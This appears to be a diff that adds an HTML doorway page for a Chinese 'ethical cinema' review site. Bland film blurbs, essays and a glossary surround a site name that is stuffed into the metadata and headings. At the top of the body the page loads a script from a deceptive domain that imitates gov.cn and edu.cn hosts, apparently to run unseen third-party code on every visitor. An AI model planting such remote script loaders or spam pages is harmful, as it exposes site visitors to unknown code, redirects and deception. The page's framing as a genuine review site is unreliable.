@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="秋霞电影网伦理专注伦理题材影视作品的在线赏析与资讯分享，汇集经典伦理电影、人性剧情片、社会写实剧集的影片介绍、导演解读、角色评析与观影感悟，为影迷提供有温度、有深度的影视内容导航。">
+<meta name="keywords" content="秋霞电影网伦理, 伦理电影, 人性剧情片, 社会写实影视, 伦理题材影片介绍, 经典伦理片推荐, 导演访谈, 影视评析">
+<meta name="author" content="秋霞电影网伦理">
+<meta name="theme-color" content="#1a1428">
+<title>秋霞电影网伦理 | 聚焦人性光影的伦理影视赏析与资讯平台</title>
+<style>
+  :root{
+    --ink:#1a1428;
+    --plum:#7b2d5c;
+    --rose:#c1446e;
+    --gold:#e3b04b;
+    --paper:#f7f3ec;
+    --muted:#8a8299;
+    --line:rgba(26,20,40,.12);
+  }
+  *{box-sizing:border-box;}
+  html{-webkit-text-size-adjust:100%;}
+  body{
+    margin:0;
+    font-family:"Songti SC","STSong","Source Han Serif SC","Noto Serif CJK SC",Georgia,serif;
+    background:var(--paper);
+    color:var(--ink);
+    line-height:1.9;
+    font-size:16px;
+  }
+  a{color:var(--plum);text-decoration:none;}
+  a:hover{color:var(--rose);}
+  .wrap{max-width:1080px;margin:0 auto;padding:0 20px;}
+
+  /* 顶部 */
+  header.site{
+    background:
+      radial-gradient(1200px 400px at 80% -10%, rgba(193,68,110,.28), transparent 60%),
+      linear-gradient(160deg,#241a38 0%, #140e22 100%);
+    color:#f4ecf7;
+    padding:38px 0 30px;
+    border-bottom:3px solid var(--gold);
+  }
+  header.site .wrap{display:flex;align-items:flex-end;justify-content:space-between;gap:24px;flex-wrap:wrap;}
+  .brand h1{
+    margin:0;
+    font-size:30px;
+    letter-spacing:2px;
+    font-weight:700;
+  }
+  .brand .sub{
+    margin-top:8px;
+    font-size:13px;
+    color:#c9bcd6;
+    letter-spacing:1px;
+    font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;
+  }
+  .brand .url{
+    margin-top:14px;
+    display:inline-block;
+    font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    font-size:12px;
+    color:var(--gold);
+    border:1px solid rgba(227,176,75,.5);
+    padding:4px 10px;
+    border-radius:2px;
+  }
+  nav.top ul{list-style:none;margin:0;padding:0;display:flex;gap:10px;flex-wrap:wrap;justify-content:flex-end;}
+  nav.top a{
+    color:#e7ddef;
+    font-size:14px;
+    padding:7px 14px;
+    border:1px solid rgba(231,221,239,.25);
+    border-radius:20px;
+    font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;
+    transition:.25s;
+  }
+  nav.top a:hover{background:var(--gold);color:#241a38;border-color:var(--gold);}
+
+  /* 导语 */
+  .lede{
+    background:#fff;
+    border-left:4px solid var(--rose);
+    padding:22px 26px;
+    margin:34px 0 10px;
+    box-shadow:0 6px 22px rgba(26,20,40,.06);
+  }
+  .lede p{margin:0;font-size:17px;}
+  .lede p+p{margin-top:12px;}
+  .lede .tag{
+    display:inline-block;
+    background:var(--ink);
+    color:var(--gold);
+    font-size:12px;
+    padding:2px 10px;
+    margin-right:8px;
+    vertical-align:2px;
+    font-family:-apple-system,"PingFang SC",sans-serif;
+  }
+
+  /* 栏目通用 */
+  section.panel{padding:44px 0 8px;}
+  .panel-head{display:flex;align-items:baseline;gap:14px;border-bottom:1px dashed var(--line);padding-bottom:12px;margin-bottom:24px;}
+  .panel-head .no{
+    font-family:Georgia,serif;
+    font-size:34px;
+    color:var(--rose);
+    font-weight:700;
+    line-height:1;
+  }
+  .panel-head h2{margin:0;font-size:23px;letter-spacing:1px;}
+  .panel-head .en{
+    margin-left:auto;
+    font-size:12px;
+    color:var(--muted);
+    letter-spacing:2px;
+    text-transform:uppercase;
+    font-family:-apple-system,"PingFang SC",sans-serif;
+  }
+
+  /* 影片卡 */
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:20px;}
+  .card{
+    background:#fff;
+    border:1px solid var(--line);
+    overflow:hidden;
+    transition:.3s;
+  }
+  .card:hover{transform:translateY(-4px);box-shadow:0 14px 30px rgba(26,20,40,.12);}
+  .card .frame{
+    position:relative;
+    aspect-ratio:3/4;
+    background:linear-gradient(135deg,#4a2240,#241a38);
+    display:flex;align-items:center;justify-content:center;
+  }
+  .card .frame span{
+    color:var(--gold);
+    font-size:15px;
+    letter-spacing:3px;
+    writing-mode:vertical-rl;
+    opacity:.85;
+  }
+  .card .meta{padding:14px 16px;}
+  .card h3{margin:0 0 6px;font-size:17px;}
+  .card .info{font-size:12px;color:var(--muted);font-family:-apple-system,"PingFang SC",sans-serif;}
+  .card p{margin:10px 0 0;font-size:14px;color:#4a4456;}
+
+  /* 文章列表 */
+  ol.articles{list-style:none;margin:0;padding:0;counter-reset:w;}
+  ol.articles li{
+    counter-increment:w;
+    display:flex;
+    gap:16px;
+    padding:18px 0;
+    border-bottom:1px solid var(--line);
+  }
+  ol.articles li::before{
+    content:counter(w,decimal-leading-zero);
+    font-family:Georgia,serif;
+    font-size:26px;
+    color:var(--gold);
+    font-weight:700;
+    line-height:1.4;
+    min-width:52px;
+  }
+  ol.articles h3{margin:0 0 4px;font-size:18px;}
+  ol.articles .date{font-size:12px;color:var(--muted);font-family:-apple-system,"PingFang SC",sans-serif;}
+
+  /* 导演 */
+  .director{
+    display:grid;
+    grid-template-columns:120px 1fr;
+    gap:20px;
+    background:#fff;
+    border:1px solid var(--line);
+    padding:20px;
+    margin-bottom:16px;
+  }
+  .director .avatar{
+    width:120px;height:120px;border-radius:50%;
+    background:radial-gradient(circle at 50% 35%,#a8567c,#3a1e34);
+  }
+  .director h3{margin:0 0 6px;font-size:19px;}
+  .director .bio{font-size:13px;color:var(--muted);margin-bottom:8px;font-family:-apple-system,"PingFang SC",sans-serif;}
+
+  /* 词条 */
+  dl.terms{margin:0;background:#fff;border:1px solid var(--line);}
+  dl.terms div{padding:16px 20px;border-bottom:1px dashed var(--line);}
+  dl.terms div:last-child{border-bottom:none;}
+  dl.terms dt{font-weight:700;color:var(--plum);font-size:17px;margin-bottom:4px;}
+  dl.terms dd{margin:0;font-size:14.5px;color:#4a4456;}
+
+  /* 页脚 */
+  footer.site{
+    margin-top:50px;
+    background:var(--ink);
+    color:#cfc5db;
+    padding:38px 0 26px;
+    font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;
+  }
+  footer.site .cols{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:24px;}
+  footer.site h4{color:var(--gold);font-size:15px;margin:0 0 12px;font-family:inherit;}
+  footer.site ul{list-style:none;margin:0;padding:0;font-size:13px;line-height:2;}
+  footer.site .copy{border-top:1px solid rgba(231,221,239,.15);margin-top:26px;padding-top:16px;font-size:12px;color:#9a90ab;}
+  footer.site .copy b{color:var(--gold);}
+
+  /* 移动端 */
+  @media (max-width:640px){
+    body{font-size:15px;}
+    header.site{padding:28px 0 22px;}
+    .brand h1{font-size:24px;}
+    nav.top a{padding:6px 11px;font-size:13px;}
+    .panel-head h2{font-size:19px;}
+    .panel-head .en{display:none;}
+    .director{grid-template-columns:1fr;text-align:center;}
+    .director .avatar{margin:0 auto;}
+    ol.articles li{gap:10px;}
+    ol.articles li::before{font-size:20px;min-width:36px;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header class="site">
+  <div class="wrap">
+    <div class="brand">
+      <h1>秋霞电影网伦理</h1>
+      <div class="sub">以影像叩问人性 · 以故事审视伦理</div>
+      <span class="url">https://qiuxiadianyingwanglunli-app.github.io</span>
+    </div>
+    <nav class="top" aria-label="主导航">
+      <ul>
+        <li><a href="#films">伦理影片</a></li>
+        <li><a href="#articles">深度评析</a></li>
+        <li><a href="#directors">导演谱系</a></li>
+        <li><a href="#terms">概念词典</a></li>
+        <li><a href="#about">关于我们</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <div class="lede">
+    <p><span class="tag">写在前面</span>伦理，是电影最不愿轻易触碰、却又最无法回避的一处暗角。<strong>秋霞电影网伦理</strong>不做简单的影片搬运，而是把镜头对准那些关于欲望、责任、背叛、救赎与选择的叙事，陪你一起读懂画面之外的犹疑与重量。</p>
+    <p>本站收录的每一部作品，都试图回答同一个问题：当规则与人性相撞，人该如何自处。愿你在此找到的不只是片单，更是一面审视自身的镜子。</p>
+  </div>
+
+  <!-- 栏目一 -->
+  <section class="panel" id="films">
+    <div class="panel-head">
+      <span class="no">01</span>
+      <h2>伦理影片典藏</h2>
+      <span class="en">Ethical Cinema Collection</span>
+    </div>
+    <div class="grid">
+      <article class="card">
+        <div class="frame"><span>婚姻故事</span></div>
+        <div class="meta">
+          <h3>《婚姻故事》</h3>
+          <div class="info">2019 · 美国 · 家庭伦理</div>
+          <p>一场离婚如何撕开爱与责任的缝隙。没有对错分明，只有两个疲惫灵魂的互相损耗与最终和解。</p>
+        </div>
+      </article>
+      <article class="card">
+        <div class="frame"><span>小偷家族</span></div>
+        <div class="meta">
+          <h3>《小偷家族》</h3>
+          <div class="info">2018 · 日本 · 社会写实</div>
+          <p>没有血缘的人，能否组成一个家？是善意的收容，还是自私的占有，法律与情感在此激烈交锋。</p>
+        </div>
+      </article>
+      <article class="card">
+        <div class="frame"><span>寄生虫</span></div>
+        <div class="meta">
+          <h3>《寄生虫》</h3>
+          <div class="info">2019 · 韩国 · 阶级伦理</div>
+          <p>地下室与花园之间，隔着的不只是台阶，更是一道关于尊严与生存的伦理鸿沟。</p>
+        </div>
+      </article>
+      <article class="card">
+        <div class="frame"><span>燃烧女子的肖像</span></div>
+        <div class="meta">
+          <h3>《燃烧女子的肖像》</h3>
+          <div class="info">2019 · 法国 · 情感伦理</div>
+          <p>被凝视与被爱，哪一个更接近真实？一幅肖像画，藏着禁忌之爱与自由意志的拉锯。</p>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section class="panel" id="articles">
+    <div class="panel-head">
+      <span class="no">02</span>
+      <h2>深度评析</h2>
+      <span class="en">In-depth Review</span>
+    </div>
+    <ol class="articles">
+      <li>
+        <div>
+          <h3>当"为你好"成为枷锁：东亚家庭片中的伦理困境</h3>
+          <div class="date">发表于 2026年9月28日 · 阅读约 8 分钟</div>
+          <p>从《推手》到《吉祥如意》，几代导演反复追问：亲情的边界在哪里？孝道与个体自由，是否注定只能二选一？</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h3>镜头前的道德豁免：为何我们同情"坏人"</h3>
+          <div class="date">发表于 2026年9月15日 · 阅读约 6 分钟</div>
+          <p>电影最狡猾之处，在于它给你看见动机。当一个罪犯被拍出童年创伤，审判是否还成立？</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h3>身体、同意与凝视：#MeToo 之后的女性叙事</h3>
+          <div class="date">发表于 2026年8月30日 · 阅读约 10 分钟</div>
+          <p>从被动的被看，到主动的言说，女性导演正在重写伦理电影的语言。镜头不再回避，而是质问。</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h3>科技伦理：当人工智能拥有了"心"</h3>
+          <div class="date">发表于 2026年8月12日 · 阅读约 7 分钟</div>
+          <p>《她》《机械姬》之后，人类第一次需要回答：若一个程序懂得爱，我们有没有义务回应它？</p>
+        </div>
+      </li>
+    </ol>
+  </section>
+
+  <!-- 栏目三 -->
+  <section class="panel" id="directors">
+    <div class="panel-head">
+      <span class="no">03</span>
+      <h2>导演谱系</h2>
+      <span class="en">Auteur Lineage</span>
+    </div>
+    <div class="director">
+      <div class="avatar" aria-hidden="true"></div>
+      <div>
+        <h3>是枝裕和 Hirokazu Kore-eda</h3>
+        <div class="bio">代表作：《无人知晓》《如父如子》《小偷家族》</div>
+        <p>他从不宣判，只静静摆放。是枝裕和擅长把伦理难题还原成日常餐桌上的沉默——没有咆哮的冲突，却让人久久无法起身离席。他的镜头承认人性的软弱，也因此保留了一份温柔的敬意。</p>
+      </div>
+    </div>
+    <div class="director">
+      <div class="avatar" aria-hidden="true"></div>
+      <div>
+        <h3>李沧东 Chang-dong Lee</h3>
+        <div class="bio">代表作：《燃烧》《密阳》《诗》</div>
+        <p>他用宗教与阶级的双重视角，逼问"善"是否可能。在李沧东的世界里，伦理不是选择题，而是一场没有正确答案的受难。画面克制，余震却绵长。</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四 -->
+  <section class="panel" id="terms">
+    <div class="panel-head">
+      <span class="no">04</span>
+      <h2>伦理影视概念词典</h2>
+      <span class="en">Glossary</span>
+    </div>
+    <dl class="terms">
+      <div>
+        <dt>道德困境 Moral Dilemma</dt>
+        <dd>剧中人物面临两个都不完美的选择，无论怎样行动都将付出代价。伦理电影的核心引擎，也是观众被迫"共谋"的起点。</dd>
+      </div>
+      <div>
+        <dt>旁观者效应 Bystander Effect</dt>
+        <dd>当责任被分散，个体倾向袖手。许多社会写实影片借此质问：沉默，是否也是一种选择？</dd>
+      </div>
+      <div>
+        <dt>叙事同情 Narrative Sympathy</dt>
+        <dd>摄影机靠近谁，观众就容易原谅谁。理解这一机制，才能看清电影如何在不知不觉中改写我们的道德判断。</dd>
+      </div>
+      <div>
+        <dt>伦理结尾 Ethical Ending</dt>
+        <dd>不提供廉价和解，而把追问留给走出影院的观众。真正的伦理片，往往在字幕升起后才真正开始。</dd>
+      </div>
+    </dl>
+  </section>
+
+  <!-- 栏目五 -->
+  <section class="panel" id="about">
+    <div class="panel-head">
+      <span class="no">05</span>
+      <h2>关于秋霞电影网伦理</h2>
+      <span class="en">About</span>
+    </div>
+    <div style="background:#fff;border:1px solid var(--line);padding:24px 26px;">
+      <p><strong>秋霞电影网伦理</strong>是一个聚焦于伦理题材影视作品的赏析与资讯站点。我们相信，电影的价值不在于给出答案，而在于延长犹豫——让人在按下判断之前，多看一秒他人的处境。</p>
+      <p>站内内容涵盖<strong>伦理影片推荐、深度影评、导演访谈与概念科普</strong>四大板块，持续更新。所有影片介绍均为原创撰写，转载请注明出处与链接。</p>
+      <p>官方网址：<a href="https://qiuxiadianyingwanglunli-app.github.io">https://qiuxiadianyingwanglunli-app.github.io</a></p>
+    </div>
+  </section>
+
+</div>
+
+<footer class="site">
+  <div class="wrap">
+    <div class="cols">
+      <div>
+        <h4>快速导航</h4>
+        <ul>
+          <li><a href="#films" style="color:#cfc5db;">伦理影片典藏</a></li>
+          <li><a href="#articles" style="color:#cfc5db;">深度评析</a></li>
+          <li><a href="#directors" style="color:#cfc5db;">导演谱系</a></li>
+          <li><a href="#terms" style="color:#cfc5db;">概念词典</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>内容分类</h4>
+        <ul>
+          <li>家庭与亲情</li>
+          <li>爱情与欲望</li>
+          <li>阶级与生存</li>
+          <li>科技与人性</li>
+        </ul>
+      </div>
+      <div>
+        <h4>联系与声明</h4>
+        <ul>
+          <li>内容均为原创影评与介绍</li>
+          <li>影片版权归原作者所有</li>
+          <li>仅供交流与赏析</li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      © 2026 <b>秋霞电影网伦理</b> · 本站域名为 <b>https://qiuxiadianyingwanglunli-app.github.io</b> · 以影像叩问人性，以故事审视伦理。
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
